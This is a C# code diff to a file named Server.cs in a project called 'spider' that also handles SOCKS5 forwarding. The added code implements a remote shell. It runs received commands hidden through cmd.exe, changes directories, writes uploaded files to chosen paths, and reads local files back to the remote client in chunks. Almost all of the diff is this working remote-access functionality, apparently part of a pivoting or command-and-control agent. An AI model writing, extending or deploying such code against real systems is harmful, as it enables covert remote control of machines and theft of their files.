@@ -5,6 +5,7 @@
 
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -18,6 +19,7 @@ namespace spider
     public class Server : Node
     {
         private const int SOCKS5_MESSAGE_DATA_SIZE = 60000;
+        private const int SHELL_UPLOAD_DOWNLOAD_DATA_SIZE = 50000;
         private const int FORWARDER_UDP_TIMEOUT = 300;
         private const int SHOW_NODE_INFORMATION_WORKER_TV_SEC = 10;
         private const int SHOW_NODE_INFORMATION_WORKER_TV_USEC = 0;
@@ -195,10 +197,6 @@ namespace spider
             get { return encryption; }
             set { encryption = value; }
         }
-
-
-
-
 
         public int RecvMessage(byte[] buffer,
                                int bufferSize,
@@ -614,19 +612,983 @@ namespace spider
             return sen;
         }
 
-        private string ExecuteCommand(string input)
+        private string ExecuteCommand(string command)
         {
+            string result = "";
+            ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe",
+                                                                     $"/c {command}")
+            {
+                RedirectStandardOutput = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
 
-            return null;
+
+            using(Process process = new Process())
+            {
+                process.StartInfo = processStartInfo;
+                process.Start();
+
+                result = process.StandardOutput.ReadToEnd();
+                process.WaitForExit();
+            }
+
+            return result;
         }
 
-        private string[] SplitInput(string input)
+        private string[] SplitInput(byte[] input)
         {
-            return null;
+            string inputString;
+            string[] tokens;
+
+
+            inputString = Encoding.UTF8.GetString(input);
+            tokens = inputString.Split(' ');
+
+            return tokens;
         }
 
         private int ForwarderShell()
         {
+            int rec = 0;
+            int sen = 0;
+            int length = 0;
+
+            byte[] buffer = new byte[NODE_BUFFER_SIZE];
+            byte[] data = new byte[NODE_BUFFER_SIZE];
+            byte[] tmp;
+            int bufferMaxLength = NODE_BUFFER_SIZE;
+            int socks5MessageDataMaxSize = SOCKS5_MESSAGE_DATA_SIZE;
+            Dictionary<uint, (int, byte[])> msgsMap = new Dictionary<uint, (int, byte[])>();
+            ValueTuple<int, byte[]> msg;
+            recvMessageId = 0;
+
+            string result = "";
+            int resultSize = 0;
+            string prompt = "\ncommand >";
+            byte[] promptBytes = Encoding.UTF8.GetBytes(prompt);
+            int promptSize = promptBytes.Length;
+            byte[] input;
+            string inputString = "";
+            string[] tokens;
+            byte[] commandTmp;
+            string command = "";
+            string exitCommand = "exit";
+            bool exitFlag = false;
+            string cdCommand = "cd";
+            string uploadCommand = "upload";
+            FileStream uploadFileStream = null;
+            string uploadFileName = "";
+            string uploadFilePath = "";
+            ulong uploadFileSize = 0;
+            ulong recvUploadFileDataSize = 0;
+            ulong uploadFileRemainingSize = 0;
+            bool uploadCommandFlag = false;
+            bool uploadFileFlag = false;
+            string downloadCommand = "download";
+            FileStream downloadFileStream = null;
+            string downloadFileName = "";
+            string downloadFilePath = "";
+            ulong downloadFileSize = 0;
+            ulong downloadFileRemainingSize = 0;
+            ulong readBytes = 0;
+            ulong dataSize = 0;
+            UploadDownloadData uploadDownloadData;
+
+
+            while(true)
+            {
+                if(exitFlag == true)
+                {
+                    break;
+                }
+
+                try
+                {
+#if DEBUGPRINT
+                    Console.WriteLine("[+] [client -> server] RecvMessage");
+#endif
+                    Array.Clear(buffer,
+                                0,
+                                bufferMaxLength);
+
+                    rec = RecvMessage(buffer,
+                                      bufferMaxLength,
+                                      forwarderTvSec,
+                                      forwarderTvUsec);
+                    if(rec > 0)
+                    {
+                        if(recvMessageId == nextRecvMessageId)
+                        {
+                            nextRecvMessageId++;
+                            uploadCommandFlag = false;
+                            result = "";
+
+                            try{
+                                commandTmp = new byte[16];
+                                for(int i = 0; i < 16; i++)
+                                {
+                                    commandTmp[i] = buffer[i];
+                                }
+                                commandTmp = commandTmp.Where(b => b != 0x00).ToArray();
+                                command = Encoding.UTF8.GetString(commandTmp);
+                                if(String.Compare(command, uploadCommand) == 0)
+                                {
+                                    uploadCommandFlag = true;
+                                }else
+                                {
+                                    uploadCommandFlag = false;
+                                }
+                            }catch(Exception ex)
+                            {
+                                uploadCommandFlag = false;
+                            }
+
+                            if(uploadCommandFlag == true)
+                            {
+                                try
+                                {
+                                    if(uploadFileFlag == false)
+                                    {
+                                        uploadFileFlag = true;
+                                        uploadFileStream = null;
+                                        uploadDownloadData = new UploadDownloadData(buffer);
+
+                                        tmp = uploadDownloadData.FilePath.Where(b => b != 0x00).ToArray();
+                                        uploadFilePath = Encoding.UTF8.GetString(tmp);
+                                        uploadFilePath += "\\";
+
+                                        tmp = uploadDownloadData.FileName.Where(b => b != 0x00).ToArray();
+                                        uploadFileName = Encoding.UTF8.GetString(tmp);
+                                        uploadFileName = uploadFilePath + uploadFileName;
+                                        uploadFileSize = uploadDownloadData.FileSize;
+
+                                        uploadFileStream = new FileStream(uploadFileName,
+                                                                          FileMode.Create,
+                                                                          FileAccess.Write);
+
+                                        recvUploadFileDataSize = uploadDownloadData.DataSize;
+                                        data = uploadDownloadData.Data;
+
+                                        uploadFileStream.Write(data,
+                                                               0,
+                                                               (int)recvUploadFileDataSize);
+
+                                        uploadFileRemainingSize = uploadFileSize - recvUploadFileDataSize;
+                                        if(uploadFileRemainingSize > 0)
+                                        {
+                                            continue;
+                                        }
+                                    }else
+                                    {
+                                        uploadDownloadData = new UploadDownloadData(buffer);
+
+                                        recvUploadFileDataSize = uploadDownloadData.DataSize;
+                                        data = uploadDownloadData.Data;
+
+                                        uploadFileStream.Write(data,
+                                                               0,
+                                                               (int)recvUploadFileDataSize);
+
+                                        uploadFileRemainingSize -= recvUploadFileDataSize;
+                                        if(uploadFileRemainingSize > 0)
+                                        {
+                                            continue;
+                                        }
+                                    }
+                                }catch(Exception ex)
+                                {
+#if DEBUGPRINT
+                                    Console.WriteLine("[-] upload file error: {0}",
+                                                      ex.Message);
+#endif
+                                    Array.Clear(buffer,
+                                                0,
+                                                bufferMaxLength);
+
+                                    result = "[-] upload file error";
+                                    result += prompt;
+
+                                    tmp = Encoding.UTF8.GetBytes(result);
+                                    length = tmp.Length;
+                                    for(int i = 0; i < length; i++)
+                                    {
+                                        buffer[i] = tmp[i];
+                                    }
+
+#if DEBUGPRINT
+                                    Console.WriteLine("[+] [client <- server] SendMessage message_id:{0}",
+                                                      sendMessageId);
+#endif
+                                    sen = SendMessage(buffer,
+                                                      length,
+                                                      forwarderTvSec,
+                                                      forwarderTvUsec);
+                                    if(sen > 0)
+                                    {
+                                        sendMessageId++;
+                                    }
+
+                                    if(uploadFileStream != null)
+                                    {
+                                        uploadFileStream.Close();
+                                        uploadFileStream = null;
+                                    }
+
+                                    uploadCommandFlag = false;
+                                    uploadFileFlag = false;
+                                    uploadFileName = "";
+                                    uploadFilePath = "";
+                                    uploadFileSize = 0;
+                                    recvUploadFileDataSize = 0;
+                                    uploadFileRemainingSize = 0;
+
+                                    continue;
+                                }
+
+                                uploadFileStream.Close();
+                                uploadFileStream = null;
+
+                                Array.Clear(buffer,
+                                            0,
+                                            bufferMaxLength);
+
+                                result = "[+] upload file: ";
+                                result += uploadFileName;
+                                result += prompt;
+
+                                tmp = Encoding.UTF8.GetBytes(result);
+                                length = tmp.Length;
+                                for(int i = 0; i < length; i++)
+                                {
+                                    buffer[i] = tmp[i];
+                                }
+
+#if DEBUGPRINT
+                                Console.WriteLine("[+] [client <- server] SendMessage message_id:{0}",
+                                                  sendMessageId);
+#endif
+                                sen = SendMessage(buffer,
+                                                  length,
+                                                  forwarderTvSec,
+                                                  forwarderTvUsec);
+                                if(sen > 0)
+                                {
+                                    sendMessageId++;
+                                }
+
+                                uploadCommandFlag = false;
+                                uploadFileFlag = false;
+                                uploadFileName = "";
+                                uploadFilePath = "";
+                                uploadFileSize = 0;
+                                recvUploadFileDataSize = 0;
+                                uploadFileRemainingSize = 0;
+
+                                continue;
+                            }else
+                            {
+                                input = buffer.Where(b => b != 0x00).ToArray();
+                                tokens = SplitInput(input);
+                                if(tokens.Length == 0)
+                                {
+                                    Array.Clear(buffer,
+                                                0,
+                                                bufferMaxLength);
+
+                                    tmp = Encoding.UTF8.GetBytes(prompt);
+                                    length = tmp.Length;
+                                    for(int i = 0; i < length; i++)
+                                    {
+                                        buffer[i] = tmp[i];
+                                    }
+
+#if DEBUGPRINT
+                                    Console.WriteLine("[+] [client <- server] SendMessage message_id:{0}",
+                                                      sendMessageId);
+#endif
+                                    sen = SendMessage(buffer,
+                                                      length,
+                                                      forwarderTvSec,
+                                                      forwarderTvUsec);
+                                    if(sen > 0)
+                                    {
+                                        sendMessageId++;
+                                    }
+
+                                    continue;
+                                }else if(String.Compare(tokens[0].Replace("\r\n", "").Replace("\n", "").Replace("\r", ""), exitCommand) == 0)
+                                {
+                                    exitFlag = true;
+                                    break;
+                                }else if(String.Compare(tokens[0], cdCommand) == 0)
+                                {
+                                    if(tokens.Length > 1)
+                                    {
+                                        try
+                                        {
+                                            Directory.SetCurrentDirectory(tokens[1]);
+
+                                            Array.Clear(buffer,
+                                                        0,
+                                                        bufferMaxLength);
+
+                                            tmp = Encoding.UTF8.GetBytes(prompt);
+                                            length = tmp.Length;
+                                            for(int i = 0; i < length; i++)
+                                            {
+                                                buffer[i] = tmp[i];
+                                            }
+                                        }catch(Exception ex)
+                                        {
+#if DEBUGPRINT
+                                            Console.WriteLine("[-] change directory error: {0}, {1}",
+                                                              tokens[1],
+                                                              ex.Message);
+#endif
+                                            result = "[-] change directory error";
+                                            result += prompt;
+
+                                            tmp = Encoding.UTF8.GetBytes(result);
+                                            length = tmp.Length;
+                                            for(int i = 0; i < length; i++)
+                                            {
+                                                buffer[i] = tmp[i];
+                                            }
+                                        }
+                                    }else
+                                    {
+                                        inputString = Encoding.UTF8.GetString(input);
+                                        result = ExecuteCommand(inputString);
+                                        result += prompt;
+
+                                        tmp = Encoding.UTF8.GetBytes(result);
+                                        length = tmp.Length;
+                                        for(int i = 0; i < length; i++)
+                                        {
+                                            buffer[i] = tmp[i];
+                                        }
+                                    }
+#if DEBUGPRINT
+                                    Console.WriteLine("[+] [client <- server] SendMessage message_id:{0}",
+                                                      sendMessageId);
+#endif
+                                    sen = SendMessage(buffer,
+                                                      length,
+                                                      forwarderTvSec,
+                                                      forwarderTvUsec);
+                                   if(sen > 0)
+                                   {
+                                       sendMessageId++;
+                                   }
+
+                                   continue;
+                                }else if(tokens.Length == 3 &&
+                                         (String.Compare(tokens[0], downloadCommand) == 0))
+                                {
+                                    downloadFileStream = null;
+
+                                    try
+                                    {
+                                        downloadFileStream = new FileStream(tokens[1],
+                                                                            FileMode.Open,
+                                                                            FileAccess.Read);
+
+                                        downloadFileSize = (ulong)downloadFileStream.Length;
+                                        downloadFileRemainingSize = downloadFileSize;
+
+                                        string path = Path.GetDirectoryName(tokens[1]);
+                                        downloadFileName = Path.GetFileName(tokens[1]);
+                                        downloadFilePath = tokens[2].Replace("\r\n", "").Replace("\n", "").Replace("\r", "");
+
+                                        while(downloadFileRemainingSize > 0)
+                                        {
+                                            Array.Clear(buffer,
+                                                        0,
+                                                        bufferMaxLength);
+
+                                            Array.Clear(data,
+                                                        0,
+                                                        bufferMaxLength);
+
+                                            readBytes = 0;
+                                            dataSize = 0;
+
+                                            if(downloadFileRemainingSize <= SHELL_UPLOAD_DOWNLOAD_DATA_SIZE)
+                                            {
+                                                readBytes = (ulong)downloadFileStream.Read(data,
+                                                                                           0,
+                                                                                           (int)downloadFileRemainingSize);
+                                                dataSize = downloadFileRemainingSize;
+                                            }else
+                                            {
+                                                readBytes = (ulong)downloadFileStream.Read(data,
+                                                                                           0,
+                                                                                           SHELL_UPLOAD_DOWNLOAD_DATA_SIZE);
+                                                dataSize = SHELL_UPLOAD_DOWNLOAD_DATA_SIZE;
+                                            }
+
+                                            uploadDownloadData = new UploadDownloadData(downloadCommand,
+                                                                                        downloadFileName,
+                                                                                        downloadFilePath,
+                                                                                        downloadFileSize,
+                                                                                        dataSize,
+                                                                                        data);
+
+                                            length = uploadDownloadData.CopyToBuffer(ref buffer);
+
+#if DEBUGPRINT
+                                            Console.WriteLine("[+] [client <- server] SendMessage message_id:{0}",
+                                                              sendMessageId);
+#endif
+                                            sen = SendMessage(buffer,
+                                                              length,
+                                                              forwarderTvSec,
+                                                              forwarderTvUsec);
+                                            if(sen <= 0)
+                                            {
+                                                break;
+                                            }
+
+                                            sendMessageId++;
+                                            downloadFileRemainingSize -= readBytes;
+                                        }
+                                    }catch(Exception ex)
+                                    {
+#if DEBUGPRINT
+                                        Console.WriteLine("[-] download file error: {0}",
+                                                          ex.Message);
+#endif
+                                        Array.Clear(buffer,
+                                                    0,
+                                                    bufferMaxLength);
+
+                                        result = "[-] download file error";
+                                        result += prompt;
+
+                                        tmp = Encoding.UTF8.GetBytes(result);
+                                        length = tmp.Length;
+                                        for(int i = 0; i < length; i++)
+                                        {
+                                            buffer[i] = tmp[i];
+                                        }
+
+#if DEBUGPRINT
+                                        Console.WriteLine("[+] [client <- server] SendMessage message_id:{0}",
+                                                          sendMessageId);
+#endif
+                                        sen = SendMessage(buffer,
+                                                          length,
+                                                          forwarderTvSec,
+                                                          forwarderTvUsec);
+                                        if(sen <= 0)
+                                        {
+                                            break;
+                                        }
+
+                                        sendMessageId++;
+                                    }
+
+                                    continue;
+                                }else
+                                {
+                                    inputString = Encoding.UTF8.GetString(input);
+                                    result = ExecuteCommand(inputString);
+                                }
+
+                                Array.Clear(buffer,
+                                            0,
+                                            bufferMaxLength);
+
+                                tmp = Encoding.UTF8.GetBytes(result);
+                                resultSize = tmp.Length;
+                                if(resultSize > socks5MessageDataMaxSize - 0x10 - promptSize)
+                                {
+                                    resultSize = socks5MessageDataMaxSize - 0x10 - promptSize;
+                                }
+
+                                for(int i = 0; i < resultSize; i++)
+                                {
+                                    buffer[i] = tmp[i];
+                                }
+
+                                for(int i = 0; i < promptSize; i++)
+                                {
+                                    buffer[resultSize + i] = promptBytes[i];
+                                }
+
+                                length = resultSize + promptSize;
+#if DEBUGPRINT
+                                Console.WriteLine("[+] [client <- server] SendMessage message_id:{0}",
+                                                  sendMessageId);
+#endif
+                                sen = SendMessage(buffer,
+                                                  length,
+                                                  forwarderTvSec,
+                                                  forwarderTvUsec);
+                                if(sen > 0)
+                                {
+                                    sendMessageId++;
+                                }
+
+                                continue;
+                            }
+                        }else
+                        {
+                            msg = (rec,
+                                   buffer);
+                            msgsMap.Add(recvMessageId,
+                                        msg);
+
+                            while(msgsMap.ContainsKey(nextRecvMessageId))
+                            {
+                                msg = msgsMap[nextRecvMessageId];
+                                msgsMap.Remove(nextRecvMessageId);
+
+                                rec = msg.Item1;
+                                buffer = msg.Item2;
+
+                                nextRecvMessageId++;
+                                uploadCommandFlag = false;
+                                result = "";
+
+                                try{
+                                    commandTmp = new byte[16];
+                                    for(int i = 0; i < 16; i++)
+                                    {
+                                        commandTmp[i] = buffer[i];
+                                    }
+                                    commandTmp = commandTmp.Where(b => b != 0x00).ToArray();
+                                    command = Encoding.UTF8.GetString(commandTmp);
+                                    if(String.Compare(command, uploadCommand) == 0)
+                                    {
+                                        uploadCommandFlag = true;
+                                    }else
+                                    {
+                                        uploadCommandFlag = false;
+                                    }
+                                }catch(Exception ex)
+                                {
+                                    uploadCommandFlag = false;
+                                }
+
+                                if(uploadCommandFlag == true)
+                                {
+                                    try
+                                    {
+                                        if(uploadFileFlag == false)
+                                        {
+                                            uploadFileFlag = true;
+                                            uploadFileStream = null;
+
+                                            uploadDownloadData = new UploadDownloadData(buffer);
+
+                                            tmp = uploadDownloadData.FilePath.Where(b => b != 0x00).ToArray();
+                                            uploadFilePath = Encoding.UTF8.GetString(tmp);
+                                            uploadFilePath += "\\";
+
+                                            tmp = uploadDownloadData.FileName.Where(b => b != 0x00).ToArray();
+                                            uploadFileName = Encoding.UTF8.GetString(tmp);
+                                            uploadFileName = uploadFilePath + uploadFileName;
+                                            uploadFileSize = uploadDownloadData.FileSize;
+
+                                            uploadFileStream = new FileStream(uploadFileName,
+                                                                              FileMode.Create,
+                                                                              FileAccess.Write);
+
+                                            recvUploadFileDataSize = uploadDownloadData.DataSize;
+                                            data = uploadDownloadData.Data;
+
+                                            uploadFileStream.Write(data,
+                                                                   0,
+                                                                   (int)recvUploadFileDataSize);
+
+                                            uploadFileRemainingSize = uploadFileSize - recvUploadFileDataSize;
+                                            if(uploadFileRemainingSize > 0)
+                                            {
+                                                continue;
+                                            }
+                                        }else
+                                        {
+                                            uploadDownloadData = new UploadDownloadData(buffer);
+
+                                            recvUploadFileDataSize = uploadDownloadData.DataSize;
+                                            data = uploadDownloadData.Data;
+
+                                            uploadFileStream.Write(data,
+                                                                   0,
+                                                                   (int)recvUploadFileDataSize);
+
+                                            uploadFileRemainingSize -= recvUploadFileDataSize;
+                                            if(uploadFileRemainingSize > 0)
+                                            {
+                                                continue;
+                                            }
+                                        }
+                                    }catch(Exception ex)
+                                    {
+#if DEBUGPRINT
+                                        Console.WriteLine("[-] upload file error: {0}",
+                                                          ex.Message);
+#endif
+                                        Array.Clear(buffer,
+                                                    0,
+                                                    bufferMaxLength);
+
+                                        result = "[-] upload file error";
+                                        result += prompt;
+
+                                        tmp = Encoding.UTF8.GetBytes(result);
+                                        length = tmp.Length;
+                                        for(int i = 0; i < length; i++)
+                                        {
+                                            buffer[i] = tmp[i];
+                                        }
+
+#if DEBUGPRINT
+                                        Console.WriteLine("[+] [client <- server] SendMessage message_id:{0}",
+                                                          sendMessageId);
+#endif
+                                        sen = SendMessage(buffer,
+                                                          length,
+                                                          forwarderTvSec,
+                                                          forwarderTvUsec);
+                                        if(sen > 0)
+                                        {
+                                            sendMessageId++;
+                                        }
+
+                                        if(uploadFileStream != null)
+                                        {
+                                            uploadFileStream.Close();
+                                            uploadFileStream = null;
+                                        }
+
+                                        uploadCommandFlag = false;
+                                        uploadFileFlag = false;
+                                        uploadFileName = "";
+                                        uploadFilePath = "";
+                                        uploadFileSize = 0;
+                                        recvUploadFileDataSize = 0;
+                                        uploadFileRemainingSize = 0;
+
+                                        continue;
+                                    }
+
+                                    uploadFileStream.Close();
+                                    uploadFileStream = null;
+
+                                    Array.Clear(buffer,
+                                                0,
+                                                bufferMaxLength);
+
+                                    result = "[+] upload file: ";
+                                    result += uploadFileName;
+                                    result += prompt;
+
+                                    tmp = Encoding.UTF8.GetBytes(result);
+                                    length = tmp.Length;
+                                    for(int i = 0; i < length; i++)
+                                    {
+                                        buffer[i] = tmp[i];
+                                    }
+
+#if DEBUGPRINT
+                                    Console.WriteLine("[+] [client <- server] SendMessage message_id:{0}",
+                                                      sendMessageId);
+#endif
+                                    sen = SendMessage(buffer,
+                                                      length,
+                                                      forwarderTvSec,
+                                                      forwarderTvUsec);
+                                   if(sen > 0)
+                                   {
+                                       sendMessageId++;
+                                   }
+
+                                   uploadCommandFlag = false;
+                                   uploadFileFlag = false;
+                                   uploadFileName = "";
+                                   uploadFilePath = "";
+                                   uploadFileSize = 0;
+                                   recvUploadFileDataSize = 0;
+                                   uploadFileRemainingSize = 0;
+
+                                   continue;
+                                }else
+                                {
+                                    input = buffer.Where(b => b != 0x00).ToArray();
+                                    tokens = SplitInput(input);
+                                    if(tokens.Length == 0)
+                                    {
+                                        Array.Clear(buffer,
+                                                    0,
+                                                    bufferMaxLength);
+
+                                        tmp = Encoding.UTF8.GetBytes(prompt);
+                                        length = tmp.Length;
+                                        for(int i = 0; i < length; i++)
+                                        {
+                                            buffer[i] = tmp[i];
+                                        }
+
+#if DEBUGPRINT
+                                        Console.WriteLine("[+] [client <- server] SendMessage message_id:{0}",
+                                                          sendMessageId);
+#endif
+                                        sen = SendMessage(buffer,
+                                                          length,
+                                                          forwarderTvSec,
+                                                          forwarderTvUsec);
+                                        if(sen > 0)
+                                        {
+                                            sendMessageId++;
+                                        }
+
+                                        continue;
+                                    }else if(String.Compare(tokens[0].Replace("\r\n", "").Replace("\n", "").Replace("\r", ""), exitCommand) == 0)
+                                    {
+                                        exitFlag = true;
+                                        break;
+                                    }else if(String.Compare(tokens[0], cdCommand) == 0)
+                                    {
+                                        if(tokens.Length > 1)
+                                        {
+                                            try
+                                            {
+                                                Directory.SetCurrentDirectory(tokens[1]);
+
+                                                Array.Clear(buffer,
+                                                            0,
+                                                            bufferMaxLength);
+
+                                                tmp = Encoding.UTF8.GetBytes(prompt);
+                                                length = tmp.Length;
+                                                for(int i = 0; i < length; i++)
+                                                {
+                                                    buffer[i] = tmp[i];
+                                                }
+                                            }catch(Exception ex)
+                                            {
+#if DEBUGPRINT
+                                                Console.WriteLine("[-] change directory error: {0}, {1}",
+                                                                  tokens[1],
+                                                                  ex.Message);
+#endif
+                                                result = "[-] change directory error";
+                                                result += prompt;
+
+                                                tmp = Encoding.UTF8.GetBytes(result);
+                                                length = tmp.Length;
+                                                for(int i = 0; i < length; i++)
+                                                {
+                                                    buffer[i] = tmp[i];
+                                                }
+                                            }
+                                        }else
+                                        {
+                                            inputString = Encoding.UTF8.GetString(input);
+                                            result = ExecuteCommand(inputString);
+                                            result += prompt;
+
+                                            tmp = Encoding.UTF8.GetBytes(result);
+                                            length = tmp.Length;
+                                            for(int i = 0; i < length; i++)
+                                            {
+                                                buffer[i] = tmp[i];
+                                            }
+                                        }
+
+#if DEBUGPRINT
+                                        Console.WriteLine("[+] [client <- server] SendMessage message_id:{0}",
+                                                          sendMessageId);
+#endif
+                                        sen = SendMessage(buffer,
+                                                          length,
+                                                          forwarderTvSec,
+                                                          forwarderTvUsec);
+                                       if(sen > 0)
+                                       {
+                                           sendMessageId++;
+                                       }
+
+                                       continue;
+                                    }else if(tokens.Length == 3 &&
+                                             (String.Compare(tokens[0], downloadCommand) == 0))
+                                    {
+                                        downloadFileStream = null;
+
+                                        try
+                                        {
+                                            downloadFileStream = new FileStream(tokens[1],
+                                                                                FileMode.Open,
+                                                                                FileAccess.Read);
+
+                                            downloadFileSize = (ulong)downloadFileStream.Length;
+                                            downloadFileRemainingSize = downloadFileSize;
+
+                                            string path = Path.GetDirectoryName(tokens[1]);
+                                            downloadFileName = Path.GetFileName(tokens[1]);
+                                            downloadFilePath = tokens[2].Replace("\r\n", "").Replace("\n", "").Replace("\r", "");
+
+                                            while(downloadFileRemainingSize > 0)
+                                            {
+                                                Array.Clear(buffer,
+                                                            0,
+                                                            bufferMaxLength);
+
+                                                Array.Clear(data,
+                                                            0,
+                                                            bufferMaxLength);
+
+                                                readBytes = 0;
+                                                dataSize = 0;
+
+                                                if(downloadFileRemainingSize <= SHELL_UPLOAD_DOWNLOAD_DATA_SIZE)
+                                                {
+                                                    readBytes = (ulong)downloadFileStream.Read(data,
+                                                                                               0,
+                                                                                               (int)downloadFileRemainingSize);
+                                                    dataSize = downloadFileRemainingSize;
+                                                }else
+                                                {
+                                                    readBytes = (ulong)downloadFileStream.Read(data,
+                                                                                               0,
+                                                                                               SHELL_UPLOAD_DOWNLOAD_DATA_SIZE);
+                                                    dataSize = SHELL_UPLOAD_DOWNLOAD_DATA_SIZE;
+                                                }
+
+                                                uploadDownloadData = new UploadDownloadData(downloadCommand,
+                                                                                            downloadFileName,
+                                                                                            downloadFilePath,
+                                                                                            downloadFileSize,
+                                                                                            dataSize,
+                                                                                            data);
+
+                                                length = uploadDownloadData.CopyToBuffer(ref buffer);
+
+#if DEBUGPRINT
+                                                Console.WriteLine("[+] [client <- server] SendMessage message_id:{0}",
+                                                                  sendMessageId);
+#endif
+                                                sen = SendMessage(buffer,
+                                                                  length,
+                                                                  forwarderTvSec,
+                                                                      forwarderTvUsec);
+                                                                  if(sen <= 0)
+                                                                  {
+                                                                      break;
+                                                                  }
+
+                                                                  sendMessageId++;
+                                                                  downloadFileRemainingSize -= readBytes;
+                                            }
+                                        }catch(Exception ex)
+                                        {
+#if DEBUGPRINT
+                                            Console.WriteLine("[-] download file error: {0}",
+                                                              ex.Message);
+#endif
+                                            Array.Clear(buffer,
+                                                        0,
+                                                        bufferMaxLength);
+
+                                            result = "[-] download file error";
+                                            result += prompt;
+
+                                            tmp = Encoding.UTF8.GetBytes(result);
+                                            length = tmp.Length;
+                                            for(int i = 0; i < length; i++)
+                                            {
+                                                buffer[i] = tmp[i];
+                                            }
+
+#if DEBUGPRINT
+                                            Console.WriteLine("[+] [client <- server] SendMessage message_id:{0}",
+                                                              sendMessageId);
+#endif
+                                            sen = SendMessage(buffer,
+                                                              length,
+                                                              forwarderTvSec,
+                                                              forwarderTvUsec);
+                                            if(sen <= 0)
+                                            {
+                                                break;
+                                            }
+
+                                            sendMessageId++;
+                                        }
+
+                                        continue;
+                                    }else
+                                    {
+                                        inputString = Encoding.UTF8.GetString(input);
+                                        result = ExecuteCommand(inputString);
+                                        result += prompt;
+                                    }
+
+                                    Array.Clear(buffer,
+                                                0,
+                                                bufferMaxLength);
+
+                                    tmp = Encoding.UTF8.GetBytes(result);
+                                    resultSize = tmp.Length;
+                                    if(resultSize > socks5MessageDataMaxSize - 0x10 - promptSize)
+                                    {
+                                        resultSize = socks5MessageDataMaxSize - 0x10 - promptSize;
+                                    }
+
+                                    for(int i = 0; i < resultSize; i++)
+                                    {
+                                        buffer[i] = tmp[i];
+                                    }
+
+                                    for(int i = 0; i < promptSize; i++)
+                                    {
+                                        buffer[resultSize + i] = promptBytes[i];
+                                    }
+
+                                    length = resultSize + promptSize;
+#if DEBUGPRINT
+                                    Console.WriteLine("[+] [client <- server] SendMessage message_id:{0}",
+                                                      sendMessageId);
+#endif
+                                    sen = SendMessage(buffer,
+                                                      length,
+                                                      forwarderTvSec,
+                                                      forwarderTvUsec);
+                                    if(sen > 0)
+                                    {
+                                        sendMessageId++;
+                                    }
+
+                                    continue;
+                                }
+                            }
+
+                            buffer = new byte[NODE_BUFFER_SIZE];
+                        }
+                    }else
+                    {
+                        break;
+                    }
+                }catch(IOException ex)
+                {
+#if DEBUGPRINT
+                    Console.WriteLine("[-] ForwarderShellSendData timeout: {0}",
+                                      ex.Message);
+#endif
+                    break;
+                }catch (Exception ex)
+                {
+#if DEBUGPRINT
+                    Console.WriteLine("[-] ForwarderShellSendData error: {0}",
+                                      ex.Message);
+#endif
+                    break;
+                }
+            }
+
             return 0;
         }
 
